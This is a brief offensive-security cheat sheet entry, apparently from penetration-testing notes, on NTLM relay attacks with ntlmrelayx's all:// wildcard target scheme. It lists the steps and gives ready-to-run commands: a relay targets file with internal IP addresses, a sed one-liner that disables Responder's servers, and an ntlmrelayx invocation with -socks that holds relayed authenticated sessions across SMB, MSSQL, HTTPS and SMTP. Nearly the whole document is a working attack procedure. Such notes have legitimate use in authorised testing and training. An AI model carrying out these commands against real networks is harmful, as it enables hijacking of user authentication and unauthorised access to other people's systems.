# 12.06 ntlmrelayx all Wildcard Relay

> Use `target=all://...` to fan relayed auth across SMB/MSSQL/HTTPS/SMTP in parallel — pair with `-socks` for multi-protocol sessions.

## Overview

The all:// target scheme makes ntlmrelayx attempt to establish authenticated sessions over every protocol it supports (SMB, MSSQL, HTTPS, SMTP, etc.) for each relayed authentication. Combine with -socks to accumulate sessions across all protocols simultaneously. Set all Responder servers to Off first.

## Steps

- Edit relayTargets.txt to use all://IP for each target
- Disable ALL Responder servers: sed -i '4,18s/= On/= Off/g' Responder.conf
- Run ntlmrelayx with -socks to hold every established session
- Use socks command inside ntlmrelayx to view all protocol sessions
- Use stopservers to stop relay after capturing sufficient sessions
- Note: cannot relay back to the originating host (self-relay patched)

## Commands

### Relay targets file

```text
all://172.16.117.50\nall://172.16.117.60
```

### Disable all Responder servers

```bash
sed -i '4,18s/= On/= Off/g' Responder.conf
```

### All-protocol SOCKS relay

```bash
sudo ntlmrelayx.py -tf relayTargets.txt -smb2support -socks
```
